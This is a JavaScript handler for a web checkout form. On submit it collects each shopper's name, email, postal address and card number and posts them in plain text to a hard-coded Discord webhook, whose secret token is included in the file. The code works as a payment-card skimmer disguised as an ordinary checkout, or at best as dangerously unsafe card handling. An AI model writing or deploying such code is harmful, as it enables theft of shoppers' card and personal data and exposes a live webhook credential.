document.getElementById("checkout-form").addEventListener("submit", async (e) => {
    e.preventDefault();
  
    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const address = document.getElementById("address").value;
    const card = document.getElementById("card").value;
  
    const webhookURL = "https://discord.com/api/webhooks/1329840105476587520/3ir5ckQ1sxw580nlyb2wOJnFW1TS7kFAWiabcD6V-29Q--zNcrHHOABdsS-FbReohhU2";
  
    const payload = {
      content: "New Checkout Submission",
      embeds: [
        {
          title: "Checkout Details",
          color: 5814783,
          fields: [
            { name: "Name", value: name, inline: true },
            { name: "Email", value: email, inline: true },
            { name: "Address", value: address, inline: false },
            { name: "Card", value: card, inline: true }
          ]
        }
      ]
    };
  
    try {
      const response = await fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
  
      if (response.ok) {
        alert("Checkout information sent successfully!");
      } else {
        alert("Failed to send checkout information.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred.");
    }
  });